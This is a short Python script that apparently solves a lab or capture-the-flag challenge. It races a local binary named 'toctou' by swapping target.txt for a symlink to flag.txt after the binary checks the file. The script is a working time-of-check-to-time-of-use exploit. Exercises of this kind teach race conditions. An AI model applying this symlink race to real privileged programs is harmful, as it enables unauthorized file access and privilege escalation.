from subprocess import Popen, PIPE
import os, time

os.system('rm target.txt')
os.system('cp dummy_file.txt target.txt')
Popen(['./toctou', 'target.txt'])
Popen(['ln', '-sf', 'flag.txt', 'target.txt'])
time.sleep(5+1)
